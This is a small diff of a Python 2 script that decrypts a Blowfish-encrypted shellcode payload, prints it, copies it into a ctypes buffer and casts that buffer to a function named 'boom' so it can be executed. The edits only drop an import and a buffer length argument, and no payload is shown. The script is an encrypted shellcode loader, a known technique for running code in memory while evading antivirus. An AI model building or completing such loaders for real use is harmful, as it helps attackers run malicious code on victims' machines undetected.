@@ -2,7 +2,7 @@
 
 from ctypes import *
 from Crypto.Cipher import Blowfish
-import sys, os
+import sys
 
 if len(sys.argv) != 3:
 
@@ -28,7 +28,7 @@ for x in bytearray(decrypt):
 
 print '"' + (decrypted) + '"'
 
-buffer = create_string_buffer(shellcode, len(shellcode))
+buffer = create_string_buffer(shellcode)
 print " "
 boom = cast(buffer, CFUNCTYPE(c_void_p))
 
